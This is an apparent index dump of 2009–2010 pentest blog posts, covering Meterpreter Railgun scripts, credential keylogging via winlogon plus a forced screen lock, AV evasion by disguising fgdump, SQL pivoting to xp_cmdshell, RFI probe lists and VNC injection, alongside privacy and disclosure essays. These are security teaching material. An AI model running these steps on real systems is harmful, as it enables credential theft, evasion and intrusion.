the the Metasploit trunk with 9709, 9710, 9711 and 9712: http://www.metasploit.com/redmine/projects/framework/repository/revisions/9712 Basically what this allows you to do is make Windows API calls from Meterpreter without compiling your own DLL. It currently supports a number of Windows API dlls: iphlpapi ws2_32 kernel32 ntdll user32 advapi32 (You can find out exactly what functions are available by default in the api.rb file) It’s also very extensible, it doesn’t have a DLL or function you need? But you can read all about in the manual: ./external/source/meterpreter/source/extensions/railgun/railgun_manual.pdf Here are two examples where this comes in very handy: ","date":"2010-07-08","objectID":"https://malicious.link/posts/2010/2010-07-08-intro-to-railgun-win-api-for-meterpreter/:0:0","tags":null,"title":"Intro to RailGun: WIN API for Meterpreter","uri":"https://malicious.link/posts/2010/2010-07-08-intro-to-railgun-win-api-for-meterpreter/"},{"categories":["metasploit","meterpreter","railgun"],"content":"List Drives: The problem that I’ve had on a number of pentests is that you get shell, but from CMD or Meterpreter there is no good way to find all of the volumes (drives) attached. net use - Shows you what Network drives are connected, but not physical ones fsutil fsinfo drives - You must be an administrator to ride this train fdisk /status - Only on OLD versions of DOS, not sure when this disappeared But railgun solves this problem with a really short script: # Load the Railgun plugin **_Update: You no longer need this step_** # client.core.use(\"railgun\") # Make the API call to enum drive letters a = client.railgun.kernel32.GetLogicalDrives()[\"return\"] # Math magic to convert the binary to letters drives = [] letters = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\" (0..25).each do |i| test = letters[i,1] rem = a % (2**(i+1)) if rem \u003e 0 drives \u003c\u003c test a = a - rem end end print_line(\"Drives Available = #{drives.inspect}\") Output: Drives Available = [\"A\", \"C\", \"D\", \"P\", \"X\"] Save this as a meterpreter script and it’ll print every logical drive attached to the system even as a limited user (that the user can see). Logical drives include: (hdd, network, mass storage, optical, etc). This opens up the doors to infecting USB sticks and network drives… ","date":"2010-07-08","objectID":"https://malicious.link/posts/2010/2010-07-08-intro-to-railgun-win-api-for-meterpreter/:1:0","tags":null,"title":"Intro to RailGun: WIN API for Meterpreter","uri":"https://malicious.link/posts/2010/2010-07-08-intro-to-railgun-win-api-for-meterpreter/"},{"categories":["metasploit","meterpreter","railgun"],"content":"JEDI KEYLOGGING: One of the problems with keylogging is you never know when that person will log in, and if you’re using a client side, they have probably already logged in and you’re hoping they log into a portal or some other password protected site. Railgun to the rescue again: # Start the keylogger running in the background dumping keys every 15 seconds, attached to Winlogon** meterpreter \u003e bgrun keylogrecorder -c 1 -t 15 [*] Executed Meterpreter with Job ID 0 meterpreter \u003e [*] winlogon.exe Process found, migrating into 640 [*] Migration Successful!! [*] Starting the keystroke sniffer... [*] Keystrokes being saved in to /root/.msf3/logs/scripts/keylogrecorder/192.168.92.122_20100707.4539.txt [*] Recording # Drop to IRB to initialize railgun and lockout the workstation, forcing the user to use their credentials again.** meterpreter \u003e irb [*] Starting IRB shell [*] The 'client' variable holds the meterpreter client client.core.use(\"railgun\") =\u003e true client.railgun.user32.LockWorkStation() =\u003e {\"GetLastError\"=\u003e0, \"return\"=\u003etrue} exit meterpreter \u003e Set up “tail -f” going on the log file for the keylogger and then kill the keylogger when you’ve gotten what you came for. meterpreter \u003e bglist [*] Job 0: [\"keylogrecorder\", \"-c\", \"1\", \"-t\", \"15\"] meterpreter \u003e bgkill 0 [*] Killing background job 0... meterpreter \u003e Hope you have fun with railgun and shoot me an email mubix@hak5.org or leave a comment if you have any other crazy uses for railgun. ","date":"2010-07-08","objectID":"https://malicious.link/posts/2010/2010-07-08-intro-to-railgun-win-api-for-meterpreter/:2:0","tags":null,"title":"Intro to RailGun: WIN API for Meterpreter","uri":"https://malicious.link/posts/2010/2010-07-08-intro-to-railgun-win-api-for-meterpreter/"},{"categories":["metasploit","meterpreter","script"],"content":"Certainly nothing to fuss over, but I’ve had a fascination with setting my target’s wallpaper as sort of a calling card for years now. I’ve been able to set the registry key (HKCUControl PanelDesktopWallpaper), but until recently I didn’t know how to get it to refresh so that it displayed without forcing the user to log out… First, is the most important part, selection of the wallpaper. This is my first selection: But, it has to be a BMP. So, I created: metasploit_1024.bmp (2.3 MB) next run: reg add \"HKCU\\Control Panel\\Desktop\" /v Wallpaper /t REG_MULTI_SZ /d \"C:\\metasploit_1024.bmp\" and finally the magic: rundll32.exe user32.dll,UpdatePerUserSystemParameters thats it, run that, and it’ll refresh the settings and display the wallpaper in all of it’s glory. But I wouldn’t be a metasploit dog if I didn’t make it into a meterpreter script: download: wallpaper.rb it’s definitely not ready to be in the trunk, but it works, just edit each of the options in the file to point at the bmp you want on the victim’s wallpaper and it’ll be there. Todo: Make each parameter an option so there is no text editing involved Add the ability to convert other image types on the fly Figure out how to get the desktop color to refresh with the wallpaper ","date":"2010-06-28","objectID":"https://malicious.link/posts/2010/2010-06-28-set-wallpaper-meterpreter-script/:0:0","tags":null,"title":"Set Wallpaper Meterpreter Script","uri":"https://malicious.link/posts/2010/2010-06-28-set-wallpaper-meterpreter-script/"},{"categories":["iphone","metadata"],"content":"I was recently approached by savant, who told me that a bunch of my Twitpics had geo location in them. Larry Pesce from PaulDotCom has been doing research in this field for a while and each time he brings it up I casually checked a couple of my twitpics and came up empty handed. But, he gave me exact references, so I went to Twitpic to check them out for myself. I was surprised to see that Twitpic actually has an option to show all the “Places I’ve Been”: Hopeful, I clicked: Sweet! All of my images are clean right? But, like I said, the individual gave specific references of images. So, I pointed trusty “Jeffrey’s Exif Viewer” at one of the images that they told me about and: sure enough, it had location data in it. At a recent NoVA Hackers meetup there was a presentation on Geo forensics on mobile phones that was really enlightening, but very depressing for iPhone users like myself. For us, you can either have Location Services (GPS) on, or off. In other words, if you wanted to take a picture without geo information, you would have to open your settings, go into general, switch location services to off.. then when you wanted to use Google Maps to find something you’d have to turn it back on. Complaints of a lazy person, I know, but remembering to check, and / or going through those steps each time I wanted to find a place or take a picture was a bit beyond my tolerance level. iPhone OS 4.0 to the rescue: (calling it iOS 4 is just confusing re:cisco) One of the coolest new features is app based control of geo information. So go to Settings -\u003e General -\u003e Location Services and turn Camera (and any other app you take photos with) OFF. PS: You probably don’t need those pics sitting on Twitpic after your Tweet has come and gone. Might as well delete them. ;-) Sorry guys, I hope you have local copies. ","date":"2010-06-25","objectID":"https://malicious.link/posts/2010/2010-06-25-get-off-my-lawn-iphone-geo-blocking/:0:0","tags":null,"title":"Get off my lawn! iPhone Geo Blocking","uri":"https://malicious.link/posts/2010/2010-06-25-get-off-my-lawn-iphone-geo-blocking/"},{"categories":["antivirus"],"content":"WARNING if you use fgdump like I did, it extracts pwdump to %TEMP% at run time, which is detected by AV. First of all, I was floored when this worked. Really AV? It’s that easy? Really? So here is the break down, go get “Resource Hacker\"… You’re almost done. Only 3 steps left. (1 of which is optional) I started with fgdump, a well known hashdumping/pwdump tool. It’s detected by 80% of all AVs and by all the top 10. You see this on your AV report for your domain controller, and you’re having a bad day, probably week. Watch this magic trick though: [*] Step 1: Open Res Hacker and drag a “normal” executable on to the window or Open File. Click “Save All Resources” Essentially what you are doing in this step is simply extracting the .ico file (Icon) from the executable. Now you can do this with other tools, but we’ll be using resource hacker in a minute again, so it’s just easy to do it all with one tool. We are done with this executable unless you are doing Step 2, in that case, leave it open, open another Res Hacker window and open your ’evil’. (In our case, fgdump.exe) [*] Step 2 (Optional): If you destination executable has tell-tale signs of it’s intent, much like fgdump as seen below: You can simply copy and paste the version info from your ’normal’ executable into your new one and hit “Compile Script”: [*] Step 3: Next we need to “Add a new Resource” (our icon) into our “evil” binary. Once this prompt comes up, select the ICO file that shows the icon you want it to have (some binaries have a ton, so make sure it’s the right one). Put in ‘1’ for resource name, and ‘1033’ for your resource language. (You can play with these values, not sure what impact they have, but from the binaries I’ve looked at those values are pretty standard for a windows executable). Save your new awesome binary as something else, I chose vlc2.exe And… (drum roll) Tada! Sad isn’t it? Only 1 of the top 10 AV now detect this binary. Good job AVG and Avast! You still picked it up, but Trend, Symantec, Microsoft, ClamAV, Kaspersky, Panda, Norman, NOD32, Sunbelt, F-Secure, Fortinet, BitDefender WTF guys!? Oh and Kaspersky now flags it as “not-a-virus” but still flags it. ","date":"2010-06-03","objectID":"https://malicious.link/posts/2010/2010-06-03-av-bypass-made-stupid/:0:0","tags":null,"title":"AV bypass made stupid","uri":"https://malicious.link/posts/2010/2010-06-03-av-bypass-made-stupid/"},{"categories":["internet"],"content":"Normally I save links for my “Mubix Links” blog to keep the clutter down on this one, but I think this is one that I would like to highlight as important. The NFO, credits and summary to this copyrighted video is what I wish to highlight. http://thepiratebay.org/torrent/5573874/Hackers_Wanted_%282008%29 I am against the misuse of copyrighted material, and it is a violation of laws in many countries, including my own. I really wish this video would have been published, I’m sure it would have been a very interesting video, that I definitely would have purchased. ","date":"2010-06-01","objectID":"https://malicious.link/posts/2010/2010-06-01-a-very-important-link/:0:0","tags":null,"title":"A very important link...","uri":"https://malicious.link/posts/2010/2010-06-01-a-very-important-link/"},{"categories":["metasploit","pivoting"],"content":"The other day Chris Gates posted an excellent blog post about the WebDAV hotness that Chris Sullo (author of Nikto) cooked up (DAVTest) which Ryan Linn popped out a Metasploit module for. Anyways, the story left off being a very limited user called “Network Service”. This user has Read and Execute, but no Write access, and a very limited field of view to boot. meterpreter \u003e getuid Server username: **NT AUTHORITYNETWORK SERVICE** Lets look around a bit.. meterpreter \u003e pwd C:\\Inetpub\\wwwroot meterpreter \u003e ls Listing: C:\\Inetpub\\wwwroot =========================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 40777/rwxrwxrwx 0 dir Fri May 07 09:32:19 -0400 2010 . 40777/rwxrwxrwx 0 dir Mon May 03 12:51:48 -0400 2010 .. 40777/rwxrwxrwx 0 dir Mon May 03 12:12:57 -0400 2010 admin 100666/rw-rw-rw- 1587 fil Sat Dec 08 23:01:24 -0500 2001 default.asp 100666/rw-rw-rw- 1465 fil Sat Dec 08 23:01:24 -0500 2001 default.css 100666/rw-rw-rw- 3295 fil Thu Jan 03 12:40:48 -0500 2002 forgotpass.asp 40777/rwxrwxrwx 0 dir Mon May 03 12:12:57 -0400 2010 images 40777/rwxrwxrwx 0 dir Mon May 03 12:12:57 -0400 2010 language 100666/rw-rw-rw- 1802 fil Thu Jan 24 12:10:04 -0500 2002 logoff.asp 100666/rw-rw-rw- 7785 fil Sat Jun 15 19:49:20 -0400 2002 logon.asp 100666/rw-rw-rw- 1801 fil Mon May 03 12:42:45 -0400 2010 settings.asp 100666/rw-rw-rw- 21137 fil Wed Aug 28 11:31:42 -0400 2002 setup.asp Sweet! a “settings.asp” meterpreter \u003e cat settings.asp \u003cSCRIPT LANGUAGE = \"VBScript\"\u003e \u003c(editorial snip)\u003e SQLUser = \"sa\" SQLPass = \"SuperDuper#@rdP@$$w0rd2012\" \u003c(/editorial snip)\u003e \u003c/SCRIPT\u003e SA with clear text password. Good luck bruteforcing that one. But they block 1433 directly to the box so direct SQL queries are out. No problem. Pivoting to the rescue: meterpreter \u003e Background session 1? [y/N] msf exploit(handler) \u003e route add 192.168.56.0 255.255.255.0 1 msf exploit(handler) \u003e route print Active Routing Table ==================== Subnet Netmask Gateway ------ ------- ------- 192.168.56.0 255.255.255.0 Session 1 Then we use mssql_login to check to see if our creds are right (set BLANK_PASSWORDS to false since we already know the password and we aren’t trying to brute force it). This will be routed through our meterpreter session that has NETWORK SERVICE permissions. msf exploit(handler) \u003e use scanner/mssql/mssql_login msf auxiliary(mssql_login) \u003e set BLANK_PASSWORDS false BLANK_PASSWORDS =\u003e false msf auxiliary(mssql_login) \u003e set PASSWORD SuperDuper#@rdP@$$w0rd2012 PASSWORD =\u003e SuperDuper#@rdP@$$w0rd2012 msf auxiliary(mssql_login) \u003e set RHOSTS 192.168.56.3 RHOSTS =\u003e 192.168.56.3 msf auxiliary(mssql_login) \u003e run [*] 192.168.56.3:1433 - MSSQL - Trying username:'sa' with password:'SuperDuper#@rdP@$$w0rd2012' [+] 192.168.56.3:1433 - MSSQL - successful login 'sa' : 'SuperDuper#@rdP@$$w0rd2012' [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed Cool. Now some enumeration and check to see if xp_cmdshell is enabled (it outputs a lot of info so I cut it down to just the pieces we are looking for): msf exploit(mssql_login) \u003e use admin/mssql/mssql_enum msf auxiliary(mssql_enum) \u003e set PASSWORD SuperDuper#@rdP@$$w0rd2012 PASSWORD =\u003e SuperDuper#@rdP@$$w0rd2012 msf auxiliary(mssql_enum) \u003e set RHOST 192.168.56.3 RHOST =\u003e 192.168.56.3 msf auxiliary(mssql_enum) \u003e run [*] Running MS SQL Server Enumeration... [*] Version: [*] Microsoft SQL Server 2000 - 8.00.194 (Intel X86) [*] Aug 6 2000 00:57:48 [*] Copyright (c) 1988-2000 Microsoft Corporation [*] Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2) \u003c(editorial snip)\u003e [*] xp_cmdshell is Enabled \u003c(/editorial snip)\u003e [*] Instances found on this server: [*] MSSQLSERVER [*] Default Server Instance SQL Server Service is running under the privilege of: [*] LocalSystem [*] Auxiliary module execution completed XP_CMDSHELL and the server runs as local system. Looking good, payload time. msf auxiliary(mssql_enum) \u003e use windows/mssql/mssql_payload msf exploit(mssql_payload) \u003e se","date":"2010-05-07","objectID":"https://malicious.link/posts/2010/2010-05-07-exploit-privilege-escalation/:0:0","tags":null,"title":"0Exploit Privilege Escalation","uri":"https://malicious.link/posts/2010/2010-05-07-exploit-privilege-escalation/"},{"categories":["rant"],"content":"I have an admittedly limited view of the exploit dev world. However, from what I’ve seen devs have very few options: (Please correct me if I’m wrong) ","date":"2010-04-29","objectID":"https://malicious.link/posts/2010/2010-04-29-vuln-disclosure-summarized/:0:0","tags":null,"title":"Vuln Disclosure Summarized","uri":"https://malicious.link/posts/2010/2010-04-29-vuln-disclosure-summarized/"},{"categories":["rant"],"content":"Responsible Disclosure Direct Contact =\u003e depending on the size of the vendor and their view on security, this could result in anything from a simple thanks, a reward, to a court hearing. Exploit Broker =\u003e possibly sell, possibly not, depends on the broker. The vuln could die on the table or stolen due to too much information being given during negotiations. This route has the same financial risk as direct contact, but a lot less risk of getting sued. ZDI (or other vuln clearing house) =\u003e “instant” cash, but admittedly less than an Exploit Broker could possible get based on the financial risk to ZDI. Close to zero risk of court time (they may come after you for selling the exploit). And a lot less financial risk since (IIRC) they pay up front. But then the vulns go to also undisclosed parties, potentially the highest bidder which is probably not the vendor. “other” secretive groups who share vulns for different reasons… Just to friends =\u003e No cash, no judicial risk, but you do risk them stealing/selling your exploit. ","date":"2010-04-29","objectID":"https://malicious.link/posts/2010/2010-04-29-vuln-disclosure-summarized/:1:0","tags":null,"title":"Vuln Disclosure Summarized","uri":"https://malicious.link/posts/2010/2010-04-29-vuln-disclosure-summarized/"},{"categories":["rant"],"content":"Full Disclosure Posting it to the web for all to see/user =\u003e Possible court time, but the definite upside is the vendor is forced to react. A very quick way to make enemies. Releasing at a conference =\u003e Probable court time. ","date":"2010-04-29","objectID":"https://malicious.link/posts/2010/2010-04-29-vuln-disclosure-summarized/:2:0","tags":null,"title":"Vuln Disclosure Summarized","uri":"https://malicious.link/posts/2010/2010-04-29-vuln-disclosure-summarized/"},{"categories":["rant"],"content":"No Disclosure Keeping it to yourself =\u003e Working under the assumption that your the only one that has found that same bug is still semi relevant due to the incredibly small size of the exploit dev community. However, as Dave said, they’ll be toasting to their sleeping dead 0days some day. ","date":"2010-04-29","objectID":"https://malicious.link/posts/2010/2010-04-29-vuln-disclosure-summarized/:3:0","tags":null,"title":"Vuln Disclosure Summarized","uri":"https://malicious.link/posts/2010/2010-04-29-vuln-disclosure-summarized/"},{"categories":["rant"],"content":"No More Free Bugs My stance on this is split, while I think people should get paid for their work, I relate this movement to mowing someone’s lawn and then ringing their doorbell and asking for money. However I’m sure Robert Graham’s punch in the face metaphor also works. Like, I have stated above, I am far and away a newbie to the vuln disclosure world and this debate has been going on since before I owned my own computer, but with the brilliant minds working at it, why doesn’t anyone offer up a solid solution to it? My solution? Create a standard, something that we all abide by. I know as hackers we rebel against such things but in the interest of getting better security out there (yes, that’s what we are here for right?…. right?) we should should really work together on this. What sounds right? I mean, what is the right way to approach someone who’s lawn you’ve mowed for the work you have done? Maybe free for open source projects, and a price based on exploitability and market share of the affected product? ","date":"2010-04-29","objectID":"https://malicious.link/posts/2010/2010-04-29-vuln-disclosure-summarized/:4:0","tags":null,"title":"Vuln Disclosure Summarized","uri":"https://malicious.link/posts/2010/2010-04-29-vuln-disclosure-summarized/"},{"categories":["rant"],"content":"Reference: Vuln Trading Markets and You by Michal Zalewski (lcamtuf): =\u003e http://lcamtuf.blogspot.com/2010/04/vulnerability-trading-markets-and-you.html Vuln Disclosure is Rude by Robert Graham: =\u003e http://erratasec.blogspot.com/2010/04/vuln-disclosure-is-rude.html No More Free Bugs movement by Charlie Miller, Alex Sotirov and Dino Dai Zovi: =\u003e http://trailofbits.com/2009/03/22/no-more-free-bugs/ Dailydave Post by Dave Aitel: =\u003e http://lists.immunitysec.com/pipermail/dailydave/2010-April/006100.html ","date":"2010-04-29","objectID":"https://malicious.link/posts/2010/2010-04-29-vuln-disclosure-summarized/:5:0","tags":null,"title":"Vuln Disclosure Summarized","uri":"https://malicious.link/posts/2010/2010-04-29-vuln-disclosure-summarized/"},{"categories":["metasploit"],"content":"I’m not sure I will want to svn up tomorrow. This Cyberwarfare version has advanced powers: ","date":"2010-04-01","objectID":"https://malicious.link/posts/2010/2010-04-01-metasploit-cyberwarfare/:0:0","tags":null,"title":"Metasploit Cyberwarfare","uri":"https://malicious.link/posts/2010/2010-04-01-metasploit-cyberwarfare/"},{"categories":["tutorials","internet"],"content":"Practical Exploitation is going to be me, explaining things in the way that I see the world on the best medium for what I’m explaining, be it a short blog blurb, a video of me, a video of a desktop, or just audio. There is no schedule that I’ll be sticking to, but I will guarantee you 3 things though: If you want it explained and it has to do with infosec or hacking (I’ll do my best on the hardware side), it will be on the show. Be it a white paper that you don’t have time or want to decrypt, a tool you can’t figure out, or just something you want to learn more in-depth. That’s what it’s for. No fluff, I’ll get straight to how you use it or can understand the topic. If your bullshit flag goes up for even an instant, call me on it, and I’ll either explain why I said what I did, or apologize and correct myself. You can email, tweet, PM, IM, ask a question on the tumblr site, or just haul up and punch me at a con. Either way, please take the time to tell me I’m wrong and why. It launches today. I’ll start with topics that I know cold, I’ll move on to white papers that I thought were interesting but haven’t read yet, hopefully intermingling in anything you want to learn about. http://www.practicalexploitation.com/ and email: questions at the same domain. or call: (503) 406-8249 P.S. Room362.com and Mubix Links aren’t going anywhere. If anything they will probably start getting updated more. Room362 with stuff I cook up, as always, and Mubix Links with anything I find interesting on the web. ","date":"2010-02-23","objectID":"https://malicious.link/posts/2010/2010-02-23-practical-exploitation/:0:0","tags":null,"title":"Practical Exploitation","uri":"https://malicious.link/posts/2010/2010-02-23-practical-exploitation/"},{"categories":["burp","rsnake"],"content":"First of all, get Robert @RSnake Hansen’s RFI list here: http://ha.ckers.org/blog/20100129/large-list-of-rfis-1000/ it’s a great list, but as soon as I saw it, I was like.. hmm.. how can I use that? Well, being that I am a Burp fan, I parsed the .dat with the following line: cat rfi-locations.dat | grep -v \"^#\" | awk -F '?' '{print $1}' | sort -u \u003e rsnake_list.txt This pulls his list down to 906 entries which you can load in to Burp and hammer away with Intruder. If it pops any of them, not only have you better identified what is running on the site, but you might have just found RFI. But I wanted to take this a step further: The OSVDB archive allows you to download their entire database of vulnerabilities (after signing up for an account). I downloaded the CSV version so that I could parse it similar to how I did RSnakes. However, it definitely wasn’t that easy. I downloaded osvd-csv.latest.tar.gz, extracted it and ran the following: cat * | grep -i \"remote file inclusion\" | grep -v \",0$\" | awk -F \",\" '{print $13}' | sed 's/^\"//' | set 's/\"$//' | sort -u \u003e osvdb_rfi.txt Which got me close. About 3 hours of manual editing after that and I had another list of ~1750 possible remote file inclusions. Is this a full proof way of getting every possibility from the database? Definitely not, but it’s close, and I’d love to see some one modify and tweak my bash line to get it even closer. (Or find a completely different way) Update on 2010-02-01 14:17 by Rob Fuller RSnake has updated his list, same link, same file name with about 2300 RFIs now. ","date":"2010-01-30","objectID":"https://malicious.link/posts/2010/2010-01-30-rsnake-s-rfi-list-in-burp-suite/:0:0","tags":null,"title":"@RSnake ’s RFI List in Burp Suite","uri":"https://malicious.link/posts/2010/2010-01-30-rsnake-s-rfi-list-in-burp-suite/"},{"categories":["rant"],"content":"This is far from a new idea, however it’s not something that is easily provable. So I had an idea this morning. I posed the following question on Twitter: You know what I got in return? a resounding “No” from everyone. (well I had one outlier but, who doesn’t when you are trying to apply science to prove art) I challenge you to name another non-artistic career that people are so passionate about that they would stay in it even if they won the lottery. Here are a few that I would like to highlight: @schuetzdj @TomSellers @ethicalhack3r @dookie2000ca This was a somewhat surprising outcome. See a trend? Most people wanted to quit their jobs, and start their own infosec company. Why is this? Is it just “The American Dream” or is it because they are unhappy with the current people in leadership? Or is it simply the fact that they are hindered from actually pursuing and learning hacking/security at work? The world may never know, but I do implore firms to look at the retention rate of their actual talent. (No, I don’t buy into the No Infosec Peep left behind bull). There is a rumor that Google has a practice. 2 hours a day, you (an employee of Google) are REQUIRED to work on a project of your own, that is in no way indebted or owned by Google, even after completion. I can imagine the above answers would change if that were the case where they worked. If their employers fostered learning. As a result of Infosec / Hacking being an art, do we have our premadonas? Of course. But do we also have our Van Gogh’s and Michelangelo’s? Definitely. But, time for a bit of a reality check: @daveshackleford Ya, you have NO idea what you would really do with millions of instant cash. I think the number is some 80% of lottery winners go BANKRUPT in the first 10 years. This is because you, and EVERYONE you have ANY connection to, goes absolutely crazy. To the point that there are lottery winner support groups. However, the fact that people say it now, shows that they at least have the passion for the art. (or are just fronting) Here some honest answers to even out the tide: @shmoosr @Bolster @andrewsmhay In conclusion, I believe that hacking is a science, until passion adds the artistic fire to the mix. At least that’s what I think, draw your own conclusions. (That’s another thing I love about this field, you are constantly challenged to draw your own conclusions, to think, to learn, to improve, to be… better) ","date":"2010-01-26","objectID":"https://malicious.link/posts/2010/2010-01-26-security-can-be-an-art-not-a-science/:0:0","tags":null,"title":"Security (CAN BE) an ART not a SCIENCE","uri":"https://malicious.link/posts/2010/2010-01-26-security-can-be-an-art-not-a-science/"},{"categories":["podcasts"],"content":"I was recently on the grmn00bs podcast, I had a great time, and I can’t wait to see who they pick up next on their series: grmn00bs podcast: episode 9 Update Archive.org Link “When they were n00bs Series” Show Notes: hak5 is one of the original security shows. Rob has been featured on several segments. Twit Netcast Network with Leo Laporte is another show that’s been around for a while. Security Tube is the Youtube of security videos. This is where I’m at when I should be working. You might even find some GRM n00bs stuff rattling around there. The Academy Pro is another excellent place to go for security training. milw0rm has lots of exploits. It’s a good place to check out some old papers to brush up on security history. NewOrder is another resource to get abreast of lessons learned in the past. Jasager is the “Yes Man” Rob talks about in the show. Chris Gates’s book list has some good ideas for security reading. Syngress is a publisher of security texts. They have all my money. Donate to Johnny Long! ","date":"2010-01-08","objectID":"https://malicious.link/posts/2010/2010-01-08-grmn00bs-podcast/:0:0","tags":null,"title":"grmn00bs podcast","uri":"https://malicious.link/posts/2010/2010-01-08-grmn00bs-podcast/"},{"categories":["rant"],"content":"If you hadn’t noticed, LinkedIn has started allowing you to link your Twitter account to your LinkedIn account. So, I didn’t know this (since I opted out), but apparently LinkedIn will kick your status updates to Twitter… like when you get a new job… Privacy settings out the window! Woohoo for Web 2.0! ","date":"2009-12-22","objectID":"https://malicious.link/posts/2009/2009-12-22-linked-in-to-twitter/:0:0","tags":null,"title":"Linked in to Twitter","uri":"https://malicious.link/posts/2009/2009-12-22-linked-in-to-twitter/"},{"categories":["metasploit","meterpreter","vnc"],"content":"So yesterday (December 14th, 2009) HD Moore posted a tweet with a pic of the new VNC meterpreter script that he wrote: Looking at the script I noticed that it created a new connection (two connections outbound). Well it was the perfect excuse to take the newly refurbished portfwd command for a spin. https://github.com/mubix/stuff/blob/master/metasploit/vnc_oneport.rb Or you can get it via the SVN at Revision 7872 By creating a bind payload instead of a reverse connect we can have the payload listen locally. Then with portfwd command (just like on your home router) we forward a local port to the local host on the remote side, to the binded port. Connecting to the freshly bound port as if we were actually doing everything on the box itself. Creating a new session and a nice beautiful VNC window. ","date":"2009-12-15","objectID":"https://malicious.link/posts/2009/2009-12-15-meterpreter-tunneling-and-vnc-revamped/:0:0","tags":null,"title":"Meterpreter tunneling and VNC revamped","uri":"https://malicious.link/posts/2009/2009-12-15-meterpreter-tunneling-and-vnc-revamped/"},{"categories":["metasploit","meterpreter","vnc"],"content":"Options: meterpreter \u003e run vnc_oneport -h OPTIONS: -e \u003copt\u003e The process to run and inject into (default: notepad.exe) -h This help menu -l \u003copt\u003e The local port to listen on via port forwarding (default: 5901) -p \u003copt\u003e The port on the remote host to bind VNC to (default: randomized) meterpreter \u003e ","date":"2009-12-15","objectID":"https://malicious.link/posts/2009/2009-12-15-meterpreter-tunneling-and-vnc-revamped/:1:0","tags":null,"title":"Meterpreter tunneling and VNC revamped","uri":"https://malicious.link/posts/2009/2009-12-15-meterpreter-tunneling-and-vnc-revamped/"},{"categories":["metasploit","meterpreter","vnc"],"content":"Example Run: [*] Meterpreter session 1 opened (192.168.92.103:4444 -\u003e 192.168.92.113:1038) meterpreter \u003e **_run vnc_oneport_** [*] Creating a VNC stager: RHOST=127.0.0.1 LPORT=1207 [*] Host process notepad.exe has PID 532 [*] Allocated memory at address 0x00640000 [*] Writing the VNC stager into memory... [*] Running Payload [*] Creating a new thread within notepad.exe to run the VNC stager... [*] Starting the port forwarding from 5901 =\u003e TARGET:1207 [*] Local TCP relay created: 0.0.0.0:5901 \u003c-\u003e 127.0.0.1:1207 meterpreter \u003e [*] VNC Server session 2 opened (127.0.0.1:56893 -\u003e 127.0.0.1:5901) Connected to RFB server, using protocol version 3.3 No authentication needed Desktop name \"VNCShell [SYSTEM@WORKSTATION1] - Full Access\" VNC server default format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0 Using default colormap which is TrueColor. Pixel format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0 Using shared memory PutImage Same machine: preferring raw encoding ShmCleanup called [*] VNC Server session 2 closed. meterpreter \u003e [*] Meterpreter session 1 opened (192.168.92.103:4444 -\u003e 192.168.92.113:1038) meterpreter \u003e run vnc_oneport [*] Creating a VNC stager: RHOST=127.0.0.1 LPORT=1207 [*] Host process notepad.exe has PID 532 [*] Allocated memory at address 0x00640000 [*] Writing the VNC stager into memory... [*] Running Payload [*] Creating a new thread within notepad.exe to run the VNC stager... [*] Starting the port forwarding from 5901 =\u003e TARGET:1207 [*] Local TCP relay created: 0.0.0.0:5901 \u003c-\u003e 127.0.0.1:1207 meterpreter \u003e [*] VNC Server session 2 opened (127.0.0.1:56893 -\u003e 127.0.0.1:5901) Connected to RFB server, using protocol version 3.3 No authentication needed Desktop name \"VNCShell [SYSTEM@WORKSTATION1] - Full Access\"VNC server default format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0 Using default colormap which is TrueColor. Pixel format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0 Using shared memory PutImageSame machine: preferring raw encodingShmCleanup called [*] VNC Server session 2 closed. meterpreter \u003e ","date":"2009-12-15","objectID":"https://malicious.link/posts/2009/2009-12-15-meterpreter-tunneling-and-vnc-revamped/:2:0","tags":null,"title":"Meterpreter tunneling and VNC revamped","uri":"https://malicious.link/posts/2009/2009-12-15-meterpreter-tunneling-and-vnc-revamped/"},{"categories":["metasploit","meterpreter","vnc"],"content":"Note: The forwarded port does not close even if the meterpreter session is ended, so use the following command to close the forward: meterpreter \u003e portfwd delete -l 5901 [*] Successfully stopped TCP relay on 0.0.0.0:5901 meterpreter \u003e (Note to BT4 users: do a `apt-get install vncviewer` before using any of the vnc payloads in Metasploit) The script utilizes just one of the millions of way you can leverage 'portfwd' in your endeavors. But where it gets interesting is the fact that the delivery method for the payload never touches disk. That magic is all credited to HD though. What happens is a new process is created (notepad by default) and the newly created VNC bind payload is injected into it. But, the beauty is that it's doing local connections via the port forwarding so all you see in TCPView is: ![](/images/postimages/200912_vnc_2.png) Now it's definitely suspicious that Notepad has any connections at all, but you can use the option `-e` to provide any executable you wish, as long as it's in the path for the system. For examples, look at what's running naturally already. Plus, you would probably not be using port 4444 for a meterpreter session. But what I wanted to demonstrate with this script is the power of both meterpreter, and port forwarding. Now it's your turn to make it better. Take a look at the guts, see if anything will help you in your scripting. ","date":"2009-12-15","objectID":"https://malicious.link/posts/2009/2009-12-15-meterpreter-tunneling-and-vnc-revamped/:3:0","tags":null,"title":"Meterpreter tunneling and VNC revamped","uri":"https://malicious.link/posts/2009/2009-12-15-meterpreter-tunneling-and-vnc-revamped/"},{"categories":["metasploit","ruby"],"content":"UPDATE: if you don’t make some additional steps, the ‘rvm 1.9.1’ command only is active for the current console session. See the site for details: http://rvm.beginrescueend.com/ This short tutorial is how to get Ruby 1.9.1 on BT4 or any other Linux distro with the tool ‘rvm’ (Ruby Version Manager). The Metasploit team has put a lot of work into getting the framework to work well with 1.9.1 and still work with earlier versions. Here is a way that you can try out the new hotness, or just test to see if all of the tweaks and modules you run, work with the newer version of ruby. Metasploit with Ruby 1.9.1 from mubix on Vimeo. Update on 2009-12-10 14:19 by Rob Fuller I’ve replaced my video with a short shell script: #!/bin/bash gem install rvm rvm-install rvm install 1.9.1 rvm 1.9.1 ","date":"2009-12-09","objectID":"https://malicious.link/posts/2009/2009-12-09-metasploit-with-ruby-191/:0:0","tags":null,"title":"Metasploit with Ruby 1.9.1","uri":"https://malicious.link/posts/2009/2009-12-09-metasploit-with-ruby-191/"},{"categories":["wishlist","internet"],"content":"What’s on your list? Here 